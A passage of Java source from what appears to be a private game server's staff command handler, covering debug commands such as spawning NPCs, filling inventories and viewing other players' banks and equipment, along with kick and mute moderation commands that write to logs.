			World.sendMessage("<img=10> <col=008FB2>Another 20 voters have been rewarded! Vote now using the ::vote command!");
		}
		if(command[0].equals("test")) {
			player.getSkillManager().addExperience(Skill.FARMING, 500);
		}
		if(command[0].equalsIgnoreCase("frame")) {
			int frame = Integer.parseInt(command[1]);
			String text = command[2];
			player.getPacketSender().sendString(frame, text);
		}
		if(command[0].equals("pos")) {
			player.getPacketSender().sendMessage(player.getPosition().toString());
		}
		if(command[0].equals("npc")) {
			int id = Integer.parseInt(command[1]);
			NPC npc = new NPC(id, new Position(player.getPosition().getX(), player.getPosition().getY(), player.getPosition().getZ()));
			World.register(npc);
			npc.setConstitution(20000);
			player.getPacketSender().sendEntityHint(npc);
			/*TaskManager.submit(new Task(5) {

				@Override
				protected void execute() {
					npc.moveTo(new Position(npc.getPosition().getX() + 2, npc.getPosition().getY() + 2));
					player.getPacketSender().sendEntityHintRemoval(false);
					stop();
				}

			});*/
			//npc.getMovementCoordinator().setCoordinator(new Coordinator().setCoordinate(true).setRadius(5));
		}
		if (command[0].equals("skull")) {
			if(player.getSkullTimer() > 0) {
				player.setSkullTimer(0);
				player.setSkullIcon(0);
				player.getUpdateFlag().flag(Flag.APPEARANCE);
			} else {
				CombatFactory.skullPlayer(player);
			}
		}
		if (command[0].equals("fillinv")) {
			for(int i = 0; i < 28; i++) {
				int it = Misc.getRandom(10000);
				player.getInventory().add(it, 1);
			}
		}
		if(command[0].equals("playnpc")) {
			player.setNpcTransformationId(Integer.parseInt(command[1]));
			player.getUpdateFlag().flag(Flag.APPEARANCE);
		} else if(command[0].equals("playobject")) {
			player.getPacketSender().sendObjectAnimation(new GameObject(2283, player.getPosition().copy()), new Animation(751));
			player.getUpdateFlag().flag(Flag.APPEARANCE);
		}
		if (command[0].equals("interface")) {
			int id = Integer.parseInt(command[1]);
			player.getPacketSender().sendInterface(id);
		}
		if (command[0].equals("walkableinterface")) {
			int id = Integer.parseInt(command[1]);
			player.getPacketSender().sendWalkableInterface(id);
		}
		if (command[0].equals("anim")) {
			int id = Integer.parseInt(command[1]);
			player.performAnimation(new Animation(id));
			player.getPacketSender().sendMessage("Sending animation: " + id);
		}
		if (command[0].equals("gfx")) {
			int id = Integer.parseInt(command[1]);
			player.performGraphic(new Graphic(id));
			player.getPacketSender().sendMessage("Sending graphic: " + id);
		}
		if (command[0].equals("object")) {
			int id = Integer.parseInt(command[1]);
			player.getPacketSender().sendObject(new GameObject(id, player.getPosition(), 10, 3));
			player.getPacketSender().sendMessage("Sending object: " + id);
		}
		if (command[0].equals("config")) {
			int id = Integer.parseInt(command[1]);
			int state = Integer.parseInt(command[2]);
			player.getPacketSender().sendConfig(id, state).sendMessage("Sent config.");
		}
		if (command[0].equals("checkbank")) {
			Player plr = World.getPlayerByName(wholeCommand.substring(10));
			if(plr != null) {
				player.getPacketSender().sendMessage("Loading bank..");
				for(Bank b : player.getBanks()) {
					if(b != null) {
						b.resetItems();
					}
				}
				for(int i = 0; i < plr.getBanks().length; i++) {
					for(Item it : plr.getBank(i).getItems()) {
						if(it != null) {
							player.getBank(i).add(it, false);
						}
					}
				}
				player.getBank(0).open();
			} else {
				player.getPacketSender().sendMessage("Player is offline!");
			}
		}
		if (command[0].equals("checkinv")) {
			Player player2 = World.getPlayerByName(wholeCommand.substring(9));
			if(player2 == null) {
				player.getPacketSender().sendMessage("Cannot find that player online..");
				return;
			}
			player.getInventory().setItems(player2.getInventory().getCopiedItems()).refreshItems();
		}
		if (command[0].equals("checkequip")) {
			Player player2 = World.getPlayerByName(wholeCommand.substring(11));
			if(player2 == null) {
				player.getPacketSender().sendMessage("Cannot find that player online..");
				return;
			}
			player.getEquipment().setItems(player2.getEquipment().getCopiedItems()).refreshItems();
			WeaponInterfaces.assign(player, player.getEquipment().get(Equipment.WEAPON_SLOT));
			WeaponAnimations.assign(player, player.getEquipment().get(Equipment.WEAPON_SLOT));
			BonusManager.update(player);
			player.getUpdateFlag().flag(Flag.APPEARANCE);
		}
		if(command[0].equalsIgnoreCase("kick")) {
			String player2 = wholeCommand.substring(5);
			Player playerToKick = World.getPlayerByName(player2);
			if(playerToKick == null) {
				player.getPacketSender().sendMessage("Player "+player2+" couldn't be found on IKov.");
				return;
			} else if(playerToKick.getLocation() != Location.WILDERNESS) {
				World.deregister(playerToKick);
				player.getPacketSender().sendMessage("Kicked "+playerToKick.getUsername()+".");
				PlayerLogs.log(player.getUsername(), ""+player.getUsername()+" just kicked "+playerToKick.getUsername()+"!");
			}
		}
		if(command[0].equalsIgnoreCase("mute")) {
			String player2 = Misc.formatText(wholeCommand.substring(5));
			if(!PlayerSaving.playerExists(player2)) {
				player.getPacketSender().sendMessage("Player "+player2+" does not exist.");
				return;
			} else {
				if(PlayerPunishment.muted(player2)) {
					player.getPacketSender().sendMessage("Player "+player2+" already has an active mute.");
					return;
				}
				PlayerLogs.log(player.getUsername(), ""+player.getUsername()+" just muted "+player2+"!");
				PlayerPunishment.mute(player2);
				player.getPacketSender().sendMessage("Player "+player2+" was successfully muted. Command logs written.");
				Player plr = World.getPlayerByName(player2);
				if(plr != null) {
					plr.getPacketSender().sendMessage("You have been muted by "+player.getUsername()+".");
				}
			}
		}
	}
	
}